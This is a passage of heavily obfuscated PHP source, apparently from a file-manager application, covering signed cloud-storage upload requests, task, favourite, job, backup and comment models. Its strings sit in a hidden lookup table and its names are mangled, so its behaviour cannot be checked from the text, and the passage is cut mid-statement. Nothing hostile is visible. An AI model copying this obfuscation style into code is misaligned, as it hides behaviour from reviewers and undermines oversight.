$ê²ÀƒÚ =& $_SERVER[¯µç›È¢]; $Ç‹•‡‘ = $ê²ÀƒÚ[205]; $¶‚Êê‘Ì = $ê²ÀƒÚ[1356]; $áÊ˜º¢Î = $ê²ÀƒÚ[72]; $Ğõå“½½ = gmdate($ê²ÀƒÚ[1357]); $†Š¿éö = gmdate($ê²ÀƒÚ[768]); $èü§ˆÈ = $ê²ÀƒÚ[1358]; $Ô·ŞŞèä = $¤¢¬ê¨ë . $ê²ÀƒÚ[12]; $˜Í ÆÇ¾ = $ê²ÀƒÚ[1320]; $­¥Ä¿à = array($this->accessKey, $†Š¿éö, $this->region, $áÊ˜º¢Î, $èü§ˆÈ); $Å©§¹õš = implode($ê²ÀƒÚ[8], $­¥Ä¿à); $Ëõ¶‡• = array($ê²ÀƒÚ[1322] => gmdate($ê²ÀƒÚ[1321], strtotime($ê²ÀƒÚ[1359])), $ê²ÀƒÚ[1323] => array(array($ê²ÀƒÚ[1325] => $this->bucket), array($ê²ÀƒÚ[1324] => $Ç‹•‡‘), array($ê²ÀƒÚ[1326], $ê²ÀƒÚ[1327], $ê²ÀƒÚ[12]), array($ê²ÀƒÚ[1326], $ê²ÀƒÚ[1360], $ê²ÀƒÚ[12]), array($ê²ÀƒÚ[1326], $ê²ÀƒÚ[1361], $ê²ÀƒÚ[12]), array($ê²ÀƒÚ[1328] => $˜Í ÆÇ¾), array($ê²ÀƒÚ[1362] => $Å©§¹õš), array($ê²ÀƒÚ[1363] => $¶‚Êê‘Ì), array($ê²ÀƒÚ[1364] => $Ğõå“½½), array($ê²ÀƒÚ[1365] => $Ô·ŞŞèä))); $³å”ìíİ = base64_encode(json_encode($Ëõ¶‡•)); $»ó›Ùê = hash_hmac($ê²ÀƒÚ[1366], $†Š¿éö, $ê²ÀƒÚ[1367] . $this->secret, !0); $§¶ö¬¼Å = hash_hmac($ê²ÀƒÚ[1366], $this->region, $»ó›Ùê, !0); $¡Ì¹Ô” = hash_hmac($ê²ÀƒÚ[1366], $áÊ˜º¢Î, $§¶ö¬¼Å, !0); $–õÏüµ = hash_hmac($ê²ÀƒÚ[1366], $èü§ˆÈ, $¡Ì¹Ô”, !0); $…™Ì¾´ñ = hash_hmac($ê²ÀƒÚ[1366], $³å”ìíİ, $–õÏüµ); $½û¶ÛŒİ = array($ê²ÀƒÚ[224] => $ê²ÀƒÚ[12], $ê²ÀƒÚ[1368] => $ê²ÀƒÚ[12], $ê²ÀƒÚ[1324] => $Ç‹•‡‘, $ê²ÀƒÚ[1328] => $˜Í ÆÇ¾, $ê²ÀƒÚ[1332] => $³å”ìíİ, $ê²ÀƒÚ[1369] => $Å©§¹õš, $ê²ÀƒÚ[1370] => $¶‚Êê‘Ì, $ê²ÀƒÚ[1371] => $Ğõå“½½, $ê²ÀƒÚ[1372] => $Ô·ŞŞèä, $ê²ÀƒÚ[1373] => $…™Ì¾´ñ, $ê²ÀƒÚ[188] => $this->getHost()); return $½û¶ÛŒİ; } public function multiUploadFormData($ê¹õã‹ã, $—®—¦Œ“ = 3600) { $ÛùÑ™ÆØ =& $_SERVER[¯µç›È¢]; $ŸüÑ›ıƒ = gmdate($ÛùÑ™ÆØ[1452]); $¤ôòòµÜ = array(); $™ÉÊ¸ŒŞ = $this->client->getUploadId($this->bucket, $ê¹õã‹ã, $¤ôòòµÜ); if (!$™ÉÊ¸ŒŞ) { return !1; } return array($ÛùÑ™ÆØ[232] => $™ÉÊ¸ŒŞ, $ÛùÑ™ÆØ[188] => $this->getHost() . $ÛùÑ™ÆØ[8] . $this->pathEncode($ê¹õã‹ã), $ÛùÑ™ÆØ[233] => $ŸüÑ›ıƒ, $ÛùÑ™ÆØ[105] => $ê¹õã‹ã); } public function multiUploadAuthData($‰ó£Äçû, $×‰¿ƒä = array()) { $Òç¹±ÈÎ =& $_SERVER[¯µç›È¢]; $Óñ¶¯‘ = isset($×‰¿ƒä[$Òç¹±ÈÎ[181]]) ? $×‰¿ƒä[$Òç¹±ÈÎ[181]] : $Òç¹±ÈÎ[12]; $Ê³ö—¤ = $×‰¿ƒä[$Òç¹±ÈÎ[105]]; unset($×‰¿ƒä[$Òç¹±ÈÎ[105]]); if (isset($×‰¿ƒä[$Òç¹±ÈÎ[234]])) { return $this->listUploadParts($Ê³ö—¤, $×‰¿ƒä); } $„¿âğÈÍ = array(); if (isset($×‰¿ƒä[$Òç¹±ÈÎ[1453]])) { $„¿âğÈÍ[$Òç¹±ÈÎ[1454]] = $×‰¿ƒä[$Òç¹±ÈÎ[1453]]; } $«—ôß–à = explode($Òç¹±ÈÎ[190], $this->getHost()); $Á‚´ª¸ = array($Òç¹±ÈÎ[1455] => $«—ôß–à[1], $Òç¹±ÈÎ[1456] => $Òç¹±ÈÎ[12], $Òç¹±ÈÎ[224] => $Òç¹±ÈÎ[131], $Òç¹±ÈÎ[1368] => $×‰¿ƒä[$Òç¹±ÈÎ[90]]); $ØşÕ’²… = $Òç¹±ÈÎ[237]; $Ó„¡ƒã¿ = $Òç¹±ÈÎ[8] . $this->pathEncode($Ê³ö—¤) . $Óñ¶¯‘; $Õü•š”« = $this->client->__getSignatureV4($„¿âğÈÍ, $Á‚´ª¸, $ØşÕ’²…, $Ó„¡ƒã¿); if (strpos($Óñ¶¯‘, $Òç¹±ÈÎ[236]) === 0) { if (isset($„¿âğÈÍ[$Òç¹±ÈÎ[1454]])) { $ø†ĞÒ·„ = $„¿âğÈÍ[$Òç¹±ÈÎ[1454]]; } else { if (isset($Õü•š”«[$Òç¹±ÈÎ[1454]])) { $ø†ĞÒ·„ = $Õü•š”«[$Òç¹±ÈÎ[1454]]; } else { $ø†ĞÒ·„ = hash($Òç¹±ÈÎ[1366], $Òç¹±ÈÎ[12]); } } return array($Òç¹±ÈÎ[242] => $Õü•š”«[$Òç¹±ÈÎ[242]], $Òç¹±ÈÎ[1454] => $ø†ĞÒ·„, $Òç¹±ÈÎ[233] => $Õü•š”«[$Òç¹±ÈÎ[1457]]); } return $Õü•š”«[$Òç¹±ÈÎ[242]]; } public function listUploadParts($ŒØıŸÇ, $­¨’¹´¦ = array()) { $†¥ıÃÛ• =& $_SERVER[¯µç›È¢]; $Û±æÛĞ¿ = str_replace($†¥ıÃÛ•[243], $†¥ıÃÛ•[12], $­¨’¹´¦[$†¥ıÃÛ•[181]]); $—ù““·Ä = $this->client->listParts($this->bucket, $ŒØıŸÇ, $Û±æÛĞ¿); if (!$—ù““·Ä) { return !1; } $ÔË¢ıöÃ = $†¥ıÃÛ•[1458]; foreach ($—ù““·Ä as $¢ã¹‘Êº) { $ÔË¢ıöÃ .= $†¥ıÃÛ•[1459] . "\x3c\x50\141\162\x74\116\x75\155\142\145\162\76{$¢ã¹‘Êº[$†¥ıÃÛ•[1413]]}\x3c\57\x50\x61\162\x74\116\165\155\x62\x65\162\x3e\12" . "\74\x45\x54\141\x67\76{$¢ã¹‘Êº[$†¥ıÃÛ•[1414]]}\x3c\x2f\105\x54\x61\x67\x3e\12" . $†¥ıÃÛ•[1460]; } $ÔË¢ıöÃ .= $†¥ıÃÛ•[1461]; $åôßÛš† = array(); $êãÖ›‡ò = explode($†¥ıÃÛ•[190], $this->getHost()); $åË©úò = array($†¥ıÃÛ•[1455] => $êãÖ›‡ò[1], $†¥ıÃÛ•[224] => $†¥ıÃÛ•[131], $†¥ıÃÛ•[1368] => strlen($ÔË¢ıöÃ)); $ñÇî‹Ä… = $†¥ıÃÛ•[235]; $ø»Ñï– = $†¥ıÃÛ•[8] . $this->pathEncode($ŒØıŸÇ) . $­¨’¹´¦[$†¥ıÃÛ•[181]]; $è’×¨‚ï = $this->client->__getSignatureV4($åôßÛš†, $åË©úò, $ñÇî‹Ä…, $ø»Ñï–, $ÔË¢ıöÃ); return array($†¥ıÃÛ•[242] => $è’×¨‚ï[$†¥ıÃÛ•[242]], $†¥ıÃÛ•[233] => $è’×¨‚ï[$†¥ıÃÛ•[1457]], $†¥ıÃÛ•[244] => $—ù““·Ä, $†¥ıÃÛ•[1454] => $è’×¨‚ï[$†¥ıÃÛ•[1454]]); } public function link($·Ğû¬™ë, $ÑÊ†ãÕ = array()) { return parent::link($·Ğû¬™ë, $ÑÊ†ãÕ); } public function fileOut($Î¦Õú€·, $·ó¹óĞ† = false, $Ä³Ïí· = false, $Ôëİæá = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[¯µç›È¢][1462])) { return parent::fileOutServer($Î¦Õú€·, $·ó¹óĞ†, $Ä³Ïí·, $Ôëİæá); } parent::fileOut($Î¦Õú€·, $·ó¹óĞ†, $Ä³Ïí·, $Ôëİæá); } public function fileOutImage($ÁÄ¨ªÆâ, $ÅãÚıÈ¶ = 250) { if (strstr($this->endpoint, $_SERVER[¯µç›È¢][1462])) { return parent::fileOutImageServer($ÁÄ¨ªÆâ, $ÅãÚıÈ¶); } parent::fileOutImage($ÁÄ¨ªÆâ, $ÅãÚıÈ¶); } public function fileOutLink($ö­ÚéÃÑ) { $‘å‚‡ù =& $_SERVER[¯µç›È¢]; if (substr($ö­ÚéÃÑ, 0, 7) == $‘å‚‡ù[1335]) { $ö­ÚéÃÑ = $‘å‚‡ù[1336] . substr($ö­ÚéÃÑ, 7); } header($‘å‚‡ù[172] . $ö­ÚéÃÑ); die; } public function getHost() { $„£³Œñç =& $_SERVER[¯µç›È¢]; $Ì×™©×À = str_rtrim(parent::getHost(), $„£³Œñç[8] . $this->bucket); $Ì×™©×À = explode($„£³Œñç[190], $Ì×™©×À); return $Ì×™©×À[0] . $„£³Œñç[190] . $this->bucket . $„£³Œñç[10] . $Ì×™©×À[1]; } } goto Fë„’Š¨­Ğ; c’ ¥†Á : class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\163\x74\x65\155\x2e\164\x61\x73\153\114\x69\x73\164"; public $field = array("\156\141\155\145", "\x74\x79\x70\x65", "\145\166\145\156\164", "\164\151\155\x65", "\x64\145\x73\143", "\163\x79\x73\164\145\x6d", "\x65\156\x61\x62\154\145", "\x6c\141\x73\164\x52\x75\156", "\x73\x6f\162\x74"); public function listData($Úå‡Êå» = false, $Ô°‰‘¥© = "\x73\x6f\162\x74", $ÍÂ¹Âª = false) { return parent::listData($Úå‡Êå», $Ô°‰‘¥©, $ÍÂ¹Âª); } public function add($ïÎÉ†Œ¦) { $û–Ôîœó =& $_SERVER[¯µç›È¢]; $Ã”ÔÏĞô = $this->findByName($ïÎÉ†Œ¦[$û–Ôîœó[32]]); if ($Ã”ÔÏĞô) { return !1; } $ïÎÉ†Œ¦[$û–Ôîœó[1627]] = 0; $ïÎÉ†Œ¦[$û–Ôîœó[1857]] = $this->getSort(); return parent::insert($ïÎÉ†Œ¦); } private function getSort() { $º¸‚¦½Ú =& $_SERVER[¯µç›È¢]; $—·èÏĞÙ = parent::listData(); $à¹Äúé  = array_to_keyvalue($—·èÏĞÙ, $º¸‚¦½Ú[12], $º¸‚¦½Ú[1857]); return empty($à¹Äúé ) ? 0 : max($à¹Äúé ) + 1; } public function update($ä¯«ÍÄ», $â¾¨øÑ) { $Š®…©Ğ‘ =& $_SERVER[¯µç›È¢]; $ËƒÀ­Ñ = $this->listData($ä¯«ÍÄ»); $¶‡Ô€ó = $this->findByName($â¾¨øÑ[$Š®…©Ğ‘[32]]); if (!$ËƒÀ­Ñ || $¶‡Ô€ó && $¶‡Ô€ó[$Š®…©Ğ‘[405]] != $ËƒÀ­Ñ[$Š®…©Ğ‘[405]]) { return !1; } return parent::update($ä¯«ÍÄ», $â¾¨øÑ); } public function remove($ˆìåÛ°Ó, $ë´„× = false) { $©Õ‘óŒÚ =& $_SERVER[¯µç›È¢]; $€­”·°ì = $this->listData($ˆìåÛ°Ó); if (!$€­”·°ì) { return; } if (!$ë´„× && $€­”·°ì[$©Õ‘óŒÚ[1286]] == $©Õ‘óŒÚ[99]) { return !1; } return parent::remove($ˆìåÛ°Ó); } public function enable($“ˆì—Ç, $üøûñÕé) { return $this->update($“ˆì—Ç, array($_SERVER[¯µç›È¢][2250] => $üøûñÕé)); } public function run($È«óâÊô) { return $this->update($È«óâÊô, array($_SERVER[¯µç›È¢][2260] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\165\163\145\x72\x5f\x66\141\x76"; protected function cacheFunctionAlias($ù¥ìåÍô) { $„¹Ï¨ä =& $_SERVER[¯µç›È¢]; return array($„¹Ï¨ä[1944] => array(USER_ID, $„¹Ï¨ä[2261])); } protected function listData() { $¤›Ä°Ã¬ =& $_SERVER[¯µç›È¢]; $ÁŠåÃ = array($¤›Ä°Ã¬[1657] => USER_ID, $¤›Ä°Ã¬[488] => 0); $ôØÏÎÄ = $¤›Ä°Ã¬[2262]; $¾²·èİã = $this->field($ôØÏÎÄ)->where($ÁŠåÃ)->order($¤›Ä°Ã¬[2263])->select(); return $¾²·èİã ? $¾²·èİã : array(); } protected function resetCache() { } protected function listView() { $–üëôØ =& $_SERVER[¯µç›È¢]; $òí’Âá = $this->listData(); $ÕÚÆ ó¢ = array_filter_by_field($òí’Âá, $–üëôØ[33], $–üëôØ[422]); $«æ×ß Á = array_to_keyvalue($ÕÚÆ ó¢, $–üëôØ[12], $–üëôØ[88]); if (!$«æ×ß Á) { return $òí’Âá; } $¢Œø‘¾‘ = 2000; $ÃÑ¯´Ü« = array($–üëôØ[423] => array($–üëôØ[424], $«æ×ß Á)); $‹»†Îà = Model($–üëôØ[842])->listSource($ÃÑ¯´Ü«, $¢Œø‘¾‘); $‹»†Îà = array_merge($‹»†Îà[$–üëôØ[86]], $‹»†Îà[$–üëôØ[87]]); $‹»†Îà = array_to_keyvalue($‹»†Îà, $–üëôØ[408]); foreach ($òí’Âá as $‚‡À›‘… => $ƒíŞ¯€ã) { $¾¹ÌøĞÂ = $‹»†Îà[$ƒíŞ¯€ã[$–üëôØ[88]]]; $¾¹ÌøĞÂ = $¾¹ÌøĞÂ ? $¾¹ÌøĞÂ : array(); $òí’Âá[$‚‡À›‘…] = array_merge($¾¹ÌøĞÂ, $ƒíŞ¯€ã); } return $òí’Âá; } protected function addFav($éûüĞ’, $«ïÈ¥ = '', $ƒââß·ˆ = "\163\157\x75\x72\143\x65") { $ÅŒ¼Óİû =& $_SERVER[¯µç›È¢]; $³ı‰•Ç‚ = array($ÅŒ¼Óİû[1657] => USER_ID, $ÅŒ¼Óİû[488] => 0, $ÅŒ¼Óİû[428] => $ƒââß·ˆ, $ÅŒ¼Óİû[427] => $éûüĞ’); if ($this->where($³ı‰•Ç‚)->find()) { return !1; } $³ı‰•Ç‚ = array($ÅŒ¼Óİû[1657] => USER_ID, $ÅŒ¼Óİû[488] => 0); $Ò­¬³¼ = $this->where($³ı‰•Ç‚)->max($ÅŒ¼Óİû[1857]); if (!$Ò­¬³¼) { $Ò­¬³¼ = 0; } if (!$«ïÈ¥ && $ƒââß·ˆ == $ÅŒ¼Óİû[422]) { $—¨‡İìü = Model($ÅŒ¼Óİû[1337])->where(array($ÅŒ¼Óİû[423] => $éûüĞ’))->find(); if (!$—¨‡İìü) { return !1; } $«ïÈ¥ = $—¨‡İìü[$ÅŒ¼Óİû[32]]; } $«ïÈ¥ = $this->getAutoName($«ïÈ¥); $…Á„Ñ = array($ÅŒ¼Óİû[1657] => USER_ID, $ÅŒ¼Óİû[488] => 0, $ÅŒ¼Óİû[426] => $«ïÈ¥, $ÅŒ¼Óİû[427] => $éûüĞ’, $ÅŒ¼Óİû[428] => $ƒââß·ˆ, $ÅŒ¼Óİû[1838] => $Ò­¬³¼ + 1); return $this->add($…Á„Ñ); } protected function remove($ã¯ˆà‚ä) { $Á¥ËúÈ =& $_SERVER[¯µç›È¢]; $”üçèøú = array($Á¥ËúÈ[1657] => USER_ID, $Á¥ËúÈ[425] => $ã¯ˆà‚ä); return $this->where($”üçèøú)->delete(); } protected function removeByName($Ÿå»–¾¬) { $åÛÔßÏû =& $_SERVER[¯µç›È¢]; $ï×ªîËœ = array($åÛÔßÏû[1657] => USER_ID, $åÛÔßÏû[426] => $Ÿå»–¾¬, $åÛÔßÏû[488] => 0); return $this->where($ï×ªîËœ)->delete(); } protected function rename($¼Š°åÕ½, $Á¡áã—á) { $ÁŒ÷œ­ =& $_SERVER[¯µç›È¢]; if ($¼Š°åÕ½ == $Á¡áã—á) { return !1; } $ìÃÏ®¶ñ = $this->getAutoName($Á¡áã—á); if ($Á¡áã—á != $ìÃÏ®¶ñ) { return !1; } $êëÇŞÉú = array($ÁŒ÷œ­[1657] => USER_ID, $ÁŒ÷œ­[488] => 0, $ÁŒ÷œ­[32] => $¼Š°åÕ½); return $this->where($êëÇŞÉú)->save(array($ÁŒ÷œ­[32] => $Á¡áã—á)); } protected function resetSort($ÆÌ£‡ßá) { $–Œ”¬›® =& $_SERVER[¯µç›È¢]; $ÆÌ£‡ßá = is_array($ÆÌ£‡ßá) ? $ÆÌ£‡ßá : array(); $ÅƒÄ‘€½ = array($–Œ”¬›®[1657] => USER_ID); for ($ï×òÛéì = 0; $ï×òÛéì < count($ÆÌ£‡ßá); $ï×òÛéì++) { $ÅƒÄ‘€½[$–Œ”¬›®[425]] = $ÆÌ£‡ßá[$ï×òÛéì]; $this->where($ÅƒÄ‘€½)->save(array($–Œ”¬›®[1838] => $ï×òÛéì + 1)); } return !0; } protected function moveTop($¿å£®š…) { $ÎÒ­Ï¶õ =& $_SERVER[¯µç›È¢]; $¡¾æ‡şİ = array($ÎÒ­Ï¶õ[1657] => USER_ID, $ÎÒ­Ï¶õ[488] => 0); $û¼àõß« = $this->where($¡¾æ‡şİ)->where(array($ÎÒ­Ï¶õ[32] => $¿å£®š…))->find(); if (!$û¼àõß«) { return; } $³ö–×Ø = $this->field($ÎÒ­Ï¶õ[405])->where($¡¾æ‡şİ)->order($ÎÒ­Ï¶õ[2263])->select(); $³ö–×Ø = array_to_keyvalue($³ö–×Ø, $ÎÒ­Ï¶õ[12], $ÎÒ­Ï¶õ[405]); $ì¿Õõ½ = $³ö–×Ø; $³ö–×Ø = array_remove_value($³ö–×Ø, $û¼àõß«[$ÎÒ­Ï¶õ[405]]); array_unshift($³ö–×Ø, $û¼àõß«[$ÎÒ­Ï¶õ[405]]); return $this->resetSort($³ö–×Ø); } protected function moveBottom($Í¿Ùé÷³) { $œ÷³ıˆÖ =& $_SERVER[¯µç›È¢]; $×´ÇœßĞ = array($œ÷³ıˆÖ[1657] => USER_ID, $œ÷³ıˆÖ[488] => 0); $è±Õú†Â = $this->where($×´ÇœßĞ)->max($œ÷³ıˆÖ[1857]); $¤‡»È÷¬ = array($œ÷³ıˆÖ[1857] => $è±Õú†Â + 1); return $this->where($×´ÇœßĞ)->where(array($œ÷³ıˆÖ[32] => $Í¿Ùé÷³))->save($¤‡»È÷¬); } private function getAutoName($±øŒì£) { $…›âÙ¦ =& $_SERVER[¯µç›È¢]; $¨½ËÌ¦÷ = array($…›âÙ¦[1657] => USER_ID, $…›âÙ¦[488] => 0); $ ÈĞğ‰Ñ = $this->field($…›âÙ¦[32])->where($¨½ËÌ¦÷)->select(); $ ÈĞğ‰Ñ = array_to_keyvalue($ ÈĞğ‰Ñ, $…›âÙ¦[12], $…›âÙ¦[32]); if (!$ ÈĞğ‰Ñ || !in_array($±øŒì£, $ ÈĞğ‰Ñ)) { return $±øŒì£; } for ($¶„ı©ú = 0; $¶„ı©ú < count($ ÈĞğ‰Ñ); $¶„ı©ú++) { if (!in_array($±øŒì£ . "\x28{$¶„ı©ú}\51", $ ÈĞğ‰Ñ)) { return $±øŒì£ . "\x28{$¶„ı©ú}\51"; } } return $±øŒì£ . "\50{$¶„ı©ú}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\x65\155\x2e\152\x6f\142\x4c\x69\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\x64\145\x73\x63", "\x73\157\x72\x74"); const JOB_KEY = "\x73\x65\x6c\x66\x4a\157\142\x4c\151\163\164"; public function listData($Å»“‹¸² = false, $„œ«ùÉ¤ = "\x73\157\162\x74", $µ˜•‰‚µ = false) { return parent::listData($Å»“‹¸², $„œ«ùÉ¤, $µ˜•‰‚µ); } public function remove($‹Ò‚È©›) { return parent::remove($‹Ò‚È©›); } public function add($ŠÍ°˜óº) { $Øü“ü© =& $_SERVER[¯µç›È¢]; if ($this->findByName($ŠÍ°˜óº[$Øü“ü©[32]])) { return !1; } $ŠÍ°˜óº[$Øü“ü©[1857]] = $this->getSort(); return parent::insert($ŠÍ°˜óº); } private function getSort() { $ïÕÚä÷ú =& $_SERVER[¯µç›È¢]; $ßÒÌØä† = parent::listData(); $¬ƒÜØ‰Ü = array_to_keyvalue($ßÒÌØä†, $ïÕÚä÷ú[12], $ïÕÚä÷ú[1857]); return empty($¬ƒÜØ‰Ü) ? 0 : max($¬ƒÜØ‰Ü) + 1; } public function update($ƒ•šï—Ü, $¬¢¤¾Ş) { $Øâˆ¥«• =& $_SERVER[¯µç›È¢]; $Ú¶Å×®˜ = parent::listData($ƒ•šï—Ü); $ŸÙ’« ş = $this->findByName($¬¢¤¾Ş[$Øâˆ¥«•[32]]); if (!$Ú¶Å×®˜ || $ŸÙ’« ş && $ŸÙ’« ş[$Øâˆ¥«•[405]] != $Ú¶Å×®˜[$Øâˆ¥«•[405]]) { return !1; } return parent::update($ƒ•šï—Ü, $¬¢¤¾Ş); } public function setUserJob($ïâˆ–µÑ, $«İí®âã) { $Å‡¶¬— =& $_SERVER[¯µç›È¢]; if (!is_array($«İí®âã)) { $«İí®âã = array($«İí®âã); } $ÒÌ‰¿ = parent::listData(); $Âè¯çêÄ = array_to_keyvalue($ÒÌ‰¿, $Å‡¶¬—[32]); $·ªÄ‚ğÈ = $Å‡¶¬—[386]; foreach ($«İí®âã as $±˜½šÜÎ) { if ($Âè¯çêÄ[$±˜½šÜÎ]) { $·ªÄ‚ğÈ .= $Âè¯çêÄ[$±˜½šÜÎ][$Å‡¶¬—[405]] . $Å‡¶¬—[50]; } else { $ÃÃ¾ØÎœ = $this->add($±˜½šÜÎ); $·ªÄ‚ğÈ .= $ÃÃ¾ØÎœ . $Å‡¶¬—[50]; } } $·ªÄ‚ğÈ = rtrim($·ªÄ‚ğÈ, $Å‡¶¬—[50]); Model($Å‡¶¬—[546])->metaSet($ïâˆ–µÑ, self::JOB_KEY, $·ªÄ‚ğÈ); } public function getUserJob($º‡Ó•„Î) { $ïôØÏĞ— = Model($_SERVER[¯µç›È¢][546])->metaGet($º‡Ó•„Î); return $this->getUserJobInfo($ïôØÏĞ—[self::JOB_KEY]); } public function getUserJobInfo($öØğ‚ÀŒ) { $¾±˜ş÷– =& $_SERVER[¯µç›È¢]; $É›ŠÎœ¤ = explode($¾±˜ş÷–[50], $öØğ‚ÀŒ); $‹ÔÚŠ°Ù = parent::listData(); $‹ÔÚŠ°Ù = array_remove_key($‹ÔÚŠ°Ù, $¾±˜ş÷–[207]); $¼Ôˆ¼ÁÄ = array(); foreach ($É›ŠÎœ¤ as $ØÊò¿¼Ô) { if (isset($‹ÔÚŠ°Ù[$ØÊò¿¼Ô])) { $¼Ôˆ¼ÁÄ[] = $‹ÔÚŠ°Ù[$ØÊò¿¼Ô]; } } return $¼Ôˆ¼ÁÄ; } } goto Aä‚Œ¦Á»µ; C¢òÚİ‡«: class BackupModel extends ModelBaseLight { public $optionType = "\123\171\163\164\145\x6d\x2e\x62\141\x63\153\165\x70\114\151\x73\x74"; public $field = array("\151\157", "\x6e\x61\155\145", "\x73\x74\141\164\165\x73", "\x63\x6f\156\164\x65\156\164", "\x6d\x61\156\x75\x61\x6c", "\162\x65\x73\x75\154\164", "\164\x69\x6d\145\106\x72\157\x6d", "\164\x69\x6d\145\x54\x6f"); public function config() { $Ó‹„ÍöĞ =& $_SERVER[¯µç›È¢]; $›šÒ¿Âò = Model($Ó‹„ÍöĞ[787])->get($Ó‹„ÍöĞ[797]); $›šÒ¿Âò = json_decode($›šÒ¿Âò, !0); $›šÒ¿Âò = is_array($›šÒ¿Âò) ? $›šÒ¿Âò : array(); if (!isset($›šÒ¿Âò[$Ó‹„ÍöĞ[772]])) { $›šÒ¿Âò[$Ó‹„ÍöĞ[772]] = $Ó‹„ÍöĞ[99]; } unset($›šÒ¿Âò[$Ó‹„ÍöĞ[1636]]); Action($Ó‹„ÍöĞ[1858])->taskInit(); Model($Ó‹„ÍöĞ[1635])->cacheClear(); $®¾ˆ»ŒØ = $Ó‹„ÍöĞ[1859]; $ùóûè´¦ = Model($Ó‹„ÍöĞ[1860])->findByKey($Ó‹„ÍöĞ[1654], $®¾ˆ»ŒØ); if (!$ùóûè´¦) { $ùóûè´¦ = array(); } if (isset($ùóûè´¦[$Ó‹„ÍöĞ[210]])) { $ùóûè´¦[$Ó‹„ÍöĞ[210]] = json_decode($ùóûè´¦[$Ó‹„ÍöĞ[210]], !0); } if (isset($›šÒ¿Âò[$Ó‹„ÍöĞ[210]])) { $ùóûè´¦[$Ó‹„ÍöĞ[210]][$Ó‹„ÍöĞ[1639]] = $›šÒ¿Âò[$Ó‹„ÍöĞ[210]]; unset($›šÒ¿Âò[$Ó‹„ÍöĞ[210]]); } return array_merge($ùóûè´¦, $›šÒ¿Âò); } public function listData($áç“Ú¦Ì = false, $ÕèÚÜ×É = "\155\157\144\151\x66\x79\124\x69\155\145", $³Ü±´¸Ò = false) { return parent::listData($áç“Ú¦Ì, $ÕèÚÜ×É, !0); } public function lastItem() { $ü°ŞÕßÀ = $this->listData(); return !empty($ü°ŞÕßÀ[0]) ? $ü°ŞÕßÀ[0] : null; } public function kill($¥Üé‘‘Å) { $×ŠÖäø² =& $_SERVER[¯µç›È¢]; $ŒóÉß‰ğ = $this->listData($¥Üé‘‘Å); if (!$ŒóÉß‰ğ || empty($ŒóÉß‰ğ[$×ŠÖäø²[32]])) { return !0; } Task::kill($×ŠÖäø²[796]); Task::kill($×ŠÖäø²[817]); Task::kill($×ŠÖäø²[826]); $¥ãª¶úœ = $ŒóÉß‰ğ[$×ŠÖäø²[32]]; $è¦ˆ²İ = TEMP_FILES . $×ŠÖäø²[795] . $¥ãª¶úœ . $×ŠÖäø²[8]; IO::remove($è¦ˆ²İ, !1); return $this->remove($¥Üé‘‘Å); } public function remove($ò§ó”¥˜) { $ˆúá‘œÂ = $this->listData($ò§ó”¥˜); if (!$ˆúá‘œÂ) { return !0; } return $this->backupRemove($ˆúá‘œÂ); } private function backupRemove($÷Ùòµ­œ) { parent::remove($÷Ùòµ­œ[$_SERVER[¯µç›È¢][405]]); $ÊÜ²ŠÆİ = $this->backupPath($÷Ùòµ­œ); IO::remove($ÊÜ²ŠÆİ, !1); return !0; } private function backupPath($¸…£ï±) { $şªßÃÂÎ =& $_SERVER[¯µç›È¢]; $÷§È„Óì = $¸…£ï±[$şªßÃÂÎ[32]]; $Ôğ¯í¿À = Model($şªßÃÂÎ[787])->get($şªßÃÂÎ[788]); $ˆÆ¬£ú = substr(md5($şªßÃÂÎ[789] . $Ôğ¯í¿À . $÷§È„Óì), 0, 8); return "\173\x69\x6f\72{$¸…£ï±[$şªßÃÂÎ[769]]}\x7d\x2f\144\141\x74\141\142\x61\x73\x65\x2f\142\141\x63\x6b\165\x70\57" . $÷§È„Óì . $şªßÃÂÎ[11] . $ˆÆ¬£ú; } public function start() { $§©İÖôá =& $_SERVER[¯µç›È¢]; if ($GLOBALS[$§©İÖôá[6]][$§©İÖôá[100]][$§©İÖôá[1861]] != $§©İÖôá[99]) { return !0; } $“÷¼ı”³ = $this->config(); if (!$“÷¼ı”³ || $“÷¼ı”³[$§©İÖôá[1636]] != $§©İÖôá[99]) { return !1; } $œ®¨ğÉ¨ = $this->process(); foreach ($œ®¨ğÉ¨ as $¿Çó¹‰û) { if ($¿Çó¹‰û) { return Task::restart($¿Çó¹‰û[$§©İÖôá[405]]); } } $‚ïâÕ¨• = new Backup(); $‚ËŸ¦î” = $‚ïâÕ¨•->db(); if ($‚ËŸ¦î”) { $‚ËŸ¦î” = $‚ïâÕ¨•->dbFile(); if ($‚ËŸ¦î” && $“÷¼ı”³[$§©İÖôá[772]] == $§©İÖôá[204]) { $‚ËŸ¦î” = $‚ïâÕ¨•->file(); } } Backup::set(array($§©İÖôá[767] => 1, $§©İÖôá[501] => time())); return !0; } public function process() { $ßóı÷ =& $_SERVER[¯µç›È¢]; $áü­ò¥÷ = array($ßóı÷[775] => Task::get($ßóı÷[796]), $ßóı÷[779] => Task::get($ßóı÷[817]), $ßóı÷[206] => Task::get($ßóı÷[826])); $„ı¯·Å´ = !1; foreach ($áü­ò¥÷ as &$ÉÊ˜Ç®˜) { if ($„ı¯·Å´) { $ÉÊ˜Ç®˜ = !1; continue; } if ($ÉÊ˜Ç®˜) { $¥Ãİ¶ = intval(_get($ÉÊ˜Ç®˜, $ßóı÷[1671], 0)); if (time() - $¥Ãİ¶ > 7200) { Task::kill($ÉÊ˜Ç®˜[$ßóı÷[405]]); $„ı¯·Å´ = !0; $ÉÊ˜Ç®˜ = !1; } } } return $áü­ò¥÷; } public function restore() { $íè¹‚ƒş =& $_SERVER[¯µç›È¢]; ActionCall($íè¹‚ƒş[1072], !0, 1); ActionCall($íè¹‚ƒş[1072], !0, 0); } } class CommentModel extends ModelBase { protected $tableName = "\143\157\x6d\155\x65\156\x74"; protected $tableMeta = array("\x74\x61\142\154\145\x4e\141\x6d\x65" => "\x63\157\x6d\155\145\x6e\164\137\x6d\x65\x74\x61", "\155\x65\x74\x61\106\x69\145\x6c\144" => "\143\x6f\155\x6d\x65\156\x74\111\x44"); const TYPE_SOURCE = 1; const TYPE_SHARE = 2; const TYPE_USER = 3; const TYPE_GROUP = 4; const TYPE_TOPIC = 5; const TYPE_STAR_OFFSET = 100000000; public static $TYPEALL = array(self::TYPE_SOURCE, self::TYPE_SHARE, 